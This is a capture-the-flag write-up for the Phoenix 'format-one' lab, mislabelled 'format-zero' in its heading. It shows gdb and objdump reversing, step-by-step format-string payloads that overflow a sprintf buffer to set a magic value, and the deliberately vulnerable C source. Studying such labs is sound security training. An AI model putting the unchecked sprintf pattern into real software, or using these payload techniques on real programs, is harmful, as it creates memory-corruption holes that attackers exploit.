# Phoenix format-zero
https://exploit.education/phoenix/format-one/
### Result
`Well done, the 'changeme' variable has been changed correctly!`
### Setup
Same as `format-one` but I wanted `ASLR off`. I tried to run the container with additional privileges:

```
docker run -idt --name ctf --privileged --security-opt seccomp:unconfined duckll/ctf-box
docker container exec -it ctf bash
```
But a better idea may have been just to run `sudo sysctl -w kernel.randomize_va_space=0` on the host machine.

### Compile code
This is another `sprintf` challenge. Almost identical to the last but you have to modify the payload.

```
gcc -g -fno-stack-protector -z execstack -no-pie -o format_zero format_zero.c

format_one.c:34:24: warning: format not a string literal and no format arguments [-Wformat-security]
   sprintf(locals.dest, buffer);
```
### Reversing
Finding the magic value:
```
# objdump -d format_one | grep cmp
  4005e6:	48 3d 58 10 60 00    	cmp    $0x601058,%rax
  400650:	80 3d 11 0a 20 00 00 	cmpb   $0x0,0x200a11(%rip)        # 601068 <completed.7697>
  4006fb:	3d 6c 4f 76 45       	cmp    $0x45764f6c,%eax
  400781:	48 39 dd             	cmp    %rbx,%rbp
```
That wasn't great as it included non-main code. What about:
```
# gdb -batch -ex 'file format_one' -ex 'disassemble main' | grep -i cmp
0x00000000004006fb <+116>:	cmp    eax,0x45764f6c
```
Checking how to construct the bytes:
```
# rabin2 -I format_one
arch     x86
baddr    0x400000
binsz    9152
bintype  elf
bits     64
canary   false
endian   little     <- endian order
```
### Payloads
##### No payload
```
root@bd0657a17d54:~# ./format_one
Welcome to format_one brought to you by https://exploit.education
AAAA
Uh oh, 'changeme' is not the magic value, it is 0x00000000
```
##### good payload from format_zero
```
gef➤  r
Starting program: /root/format_one
Welcome to format_one brought to you by https://exploit.education
%p %p %p %p
Uh oh, 'changeme' is not the magic value, it is 0x36783020
```
##### Create payload
`gef➤  shell echo "%p%p\x41\x41\x41\x41\x41\x41" > payload.txt`
##### Run payload
```
gef➤  r < payload.txt
Uh oh, 'changeme' is not the magic value, it is 0x3134785c
```


gef➤  set $stack_size = $rbp - $rsp
gef➤  p/d $stack_size
$1 = 80

##### Create test payload
`# python -c 'print "%31x " + "\x41\x41\x41\x41"' > payload.txt`


##### Better way to find the local variables - look at the disassembly of main()
```
0x00000000004006e0 <+89>:	lea    rdx,[rbp-0x40]
0x00000000004006e4 <+93>:	lea    rax,[rbp-0x30]
```
##### Size of user input - 16 bytes
```
gef➤  p/d 0x40 - 0x30
$4 = 16
```
##### The user inputted buffer - size 16 bytes
```
gef➤  x/4wx $rbp-0x40
0x7fffffffe520:	0x78313325	0x41414120	0x00000a41	0x00000000

gef➤  x/s $rbp-0x40
0x7fffffffe520:	"%31x AAAA\n"
```
##### The destination buffer - size 32 bytes
```
gef➤  x/s $rbp-0x30
0x7fffffffe530:	< full of junk >
````

##### Watch memory
Once `sprintf` run, you observe the destination buffer fill.
```
gef➤  memory watch $rbp-0x30 8 qword
gef➤  n
──────────────────────────────────────────────────────────────── memory:0x7fffffffe530 ────
0x00007fffffffe530│+0x0000   0x2020202020202020   
0x00007fffffffe538│+0x0008   0x2020202020202020   
0x00007fffffffe540│+0x0010   0x6620202020202020   
0x00007fffffffe548│+0x0018   0x2030323565666666   
0x00007fffffffe550│+0x0020   0x0000000a41414141   
0x00007fffffffe558│+0x0028   0x0000000000000000   
0x00007fffffffe560│+0x0030   0x0000000000400730   
0x00007fffffffe568│+0x0038   0x00007ffff7a05b97   

```

### Result
##### Create final payload
You fill the `destination buffer` using the `format arguments`. Then you `little endian` the byte order.

The final payload is `"%31x lOvE"`.

`# python -c 'print "%31x " + "\x6c\x4f\x76\x45"' > payload.txt`



### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to format_one brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```
